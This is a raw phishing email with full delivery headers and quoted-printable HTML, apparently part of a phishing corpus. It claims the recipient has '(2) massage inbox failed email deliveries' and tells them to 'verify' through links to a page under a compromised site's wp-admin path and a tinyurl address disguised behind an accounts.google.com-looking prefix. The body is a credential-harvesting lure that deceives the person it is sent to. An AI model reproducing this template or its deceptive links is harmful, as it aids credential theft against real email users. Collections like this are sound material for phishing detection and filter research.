@@ -1,0 +1,123 @@
+Return-Path: support@mglnetwork.com
+Delivered-To: jose@monkey.org
+X-FDA: 81795289716.37.45F3021
+Received: from server.mglnetwork.com (server.mglnetwork.com [162.214.230.221])
+	by imf07.b.hostedemail.com (Postfix) with ESMTP id 73B17A0025
+	for <jose@monkey.org>; Thu, 15 Feb 2024 21:13:36 +0000 (UTC)
+Authentication-Results: imf07.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=pass (imf07.b.hostedemail.com: domain of support@mglnetwork.com
+ designates 162.214.230.221 as permitted sender)
+ smtp.mailfrom=support@mglnetwork.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1708031616;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=xeWOs+cSxxhoV3BAXut1L7sTltjmAVqfRgf0bPgef7k=;
+	b=04/VJgzM/b31RTQ2SDftOunP01+z+xrBQh6+jQ76CW0E0Da1fF6CrUjfCtqB0pS2P3Qfjy
+	X0gAIq4GwR0+6rruY+lRz2eqkBf/Ot5JkQbHiz8YhbjUJgKAD0BAvfDn9mJ5qXerU7Zgpy
+	ygDW/poZLsvv2cp7VqX47+T/20z5Cmg=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1708031616; a=rsa-sha256;
+	cv=none;
+	b=UpKg/BffDDSUZ7f2rcZ6gitK1izME9CqSze4PmKiD5hgDQw4XLeFrR8dj0wOr/aCsfJH2K
+	ICvGE3V7quPvkqxvw2cw8JdnOtVxxWvFhDWYgqTywQfsiLMOzBvebzQSKQyL7E+5rNDhAE
+	mS2phFwOi1+KR+c4H2LJDmfqvfqnbH0=
+ARC-Authentication-Results: i=1;	imf07.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=pass (imf07.b.hostedemail.com: domain of
+ support@mglnetwork.com designates 162.214.230.221 as permitted sender)
+ smtp.mailfrom=support@mglnetwork.com
+Received: from [77.105.147.0] (port=64190 helo=shaky-fly.aeza.network)	by
+ server.mglnetwork.com with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim 4.96.2)	(envelope-from
+ <support@mglnetwork.com>)	id 1raj34-0005IW-1c	for jose@monkey.org;	Thu, 15
+ Feb 2024 14:13:35 -0700
+From: monkey.org < support@mglnetwork.com>
+To: jose@monkey.org
+Subject: (2) massage inbox failed email deliveries
+Date: 16 Feb 2024 00:13:32 +0300
+Message-ID: <20240216001332.69BFDAE075A7BDCA@mglnetwork.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.mglnetwork.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - mglnetwork.com
+X-Get-Message-Sender-Via:
+ server.mglnetwork.com: authenticated_id: support@mglnetwork.com
+X-Authenticated-Sender: server.mglnetwork.com: support@mglnetwork.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam02
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 73B17A0025
+X-Spam-Status: Yes, score=11.40
+X-Stat-Signature: heig8b511fnmgewpaqw9dq8cakqskhr7
+X-HE-Tag: 1708031616-757190
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+zDffFsSsokxZAwtCXBOkpqaBCCpbW4OEwmX9oh0sVBGu?=
+ =?utf-8?q?2r+QMFUu8g3/5gJO8l956gIG0x0SEOC4xm3NHSSaCCrLwr/7rMEEiBSHkp1i2vb8R?=
+ =?utf-8?q?eISLxc3AZBp9gXvkwTgjQgKRDwwrVyTHZFHILDnsdQfIoFbxrfLgAO4BkqYwU+1Xd?=
+ =?utf-8?q?6gnJvQSIIV20AZuSHI68/RB/cvZKKQszX2NFEJs4zR68usG3QDLcQgHGTqZUuyzM2?=
+ =?utf-8?q?IGeMx3MIyp8W0Dh1pwzbOFswKN7X2ty3PpTReCqjtQVKha+Una1GMp/5o/XgegHUq?=
+ =?utf-8?q?27Ym+Hpbw5575v8Jt0mPF9QQ/YDlyk27aeyAYxz4KBFfT7Ttv6UYjhQ7x2GNjFdsk?=
+ =?utf-8?q?u1Md?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 58
+
+<br><div class=3D"gmail_quote"><div dir=3D"ltr"><div style=3D"outline:none"=
+><br style=3D"outline:none"></div><div style=3D"outline:none"><div id=3D"m_=
+-2878770666189510449m_39891668627773304m_5302448105150942596m_6779590209935=
+171516gmail-yiv2942199540m_1060591085446223277m_-5364057556062311011ydpeba0=
+6609yiv0506173501" style=3D"outline:none"><div style=3D"outline:none"><div =
+style=3D"outline:none;direction:ltr;min-height:345px"><div style=3D"outline=
+:none;font-style:normal;font-variant-ligatures:normal;font-variant-caps:nor=
+mal;font-weight:400;letter-spacing:normal;text-indent:0px;text-transform:no=
+ne;word-spacing:0px;white-space:normal;text-decoration-style:initial;text-d=
+ecoration-color:initial;font-size:16px;font-family:Arial,sans-serif;color:r=
+gb(0,0,0);text-align:center;padding-top:3px;padding-left:3px;padding-right:=
+3px;background-color:rgb(255,255,255)"><p style=3D"outline:none;color:rgb(3=
+3,37,41);margin-top:0px"><b style=3D"outline:none"><u style=3D"outline:none=
+;color:rgb(34,34,34)"><span style=3D"outline:none;color:rgb(0,0,255)"><a re=
+l=3D"nofollow noopener noreferrer" style=3D"outline:none;color:rgb(151,155,=
+167);text-decoration:underline">Dear,jose@monkey.org</a></span></u></b><br =
+style=3D"outline:none"></p><p style=3D"outline:none;color:rgb(33,37,41);mar=
+gin-top:0px">You have (2) massage inbox failed email deliveries</p><p style=
+=3D"outline:none;color:rgb(33,37,41);margin-top:0px">Verify your informatio=
+n to deliver your emails</p><a rel=3D"nofollow noopener noreferrer" style=
+=3D"outline:none;color:rgb(33,37,41);text-decoration:underline" href=3D"htt=
+ps://uzuncati.com/wp-admin/pppp.html#jose@monkey.org" target=3D"_blank" dat=
+a-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://accounts.google=
+=2Ecom%2Bsignin%3Dsecure%2Bv2%2Bidentifier%3Dpassive@tinyurl.com/3hjt4n4n?l=
+ogin%3D%5B%5B-Email-%5D%5D%26vcnt%3D100%26pcnt%3D3%26no_redrct%3Dno_redrct&=
+amp;source=3Dgmail&amp;ust=3D1708066055046000&amp;usg=3DAOvVaw2vg5iFCArR0gN=
+qdbC8mtTV"><span style=3D"outline:none;color:rgb(27,11,244)">Verify your ma=
+ils</span></a><br style=3D"outline:none"></div><hr style=3D"outline:none;fo=
+nt-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font=
+-weight:400;letter-spacing:normal;text-align:left;text-indent:0px;text-tran=
+sform:none;word-spacing:0px;white-space:normal;text-decoration-style:initia=
+l;text-decoration-color:initial;border-top-style:solid;border-left-width:0p=
+x;font-size:16px;min-height:0px;font-family:Arial,sans-serif;border-right-w=
+idth:0px;border-bottom-width:0px;color:rgb(33,37,41);background-color:rgb(5=
+2,58,64)"><p style=3D"outline:none;font-style:normal;font-variant-ligatures=
+:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text=
+-indent:0px;text-transform:none;word-spacing:0px;white-space:normal;text-de=
+coration-style:initial;text-decoration-color:initial;font-size:12px;font-fa=
+mily:Arial,sans-serif;color:rgb(220,53,69);text-align:center;margin-top:0px=
+;background-color:rgb(255,255,255)"><a href=3D"https://accounts.google.com+=
+signin=3Dsecure+v2+identifier=3Dpassive@tinyurl.com/3hjt4n4n?login=3Djose@m=
+onkey.org&amp;vcnt=3D100&amp;pcnt=3D3&amp;no_redrct=3Dno_redrct" target=3D"=
+_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://acco=
+unts.google.com%2Bsignin%3Dsecure%2Bv2%2Bidentifier%3Dpassive@tinyurl.com/3=
+hjt4n4n?login%3D%5B%5B-Email-%5D%5D%26vcnt%3D100%26pcnt%3D3%26no_redrct%3Dn=
+o_redrct&amp;source=3Dgmail&amp;ust=3D1708066055046000&amp;usg=3DAOvVaw2vg5=
+iFCArR0gNqdbC8mtTV">Please kindly retrieve your email</a></p><br>
+
+</div></div></div></div></div>
+</div>
+
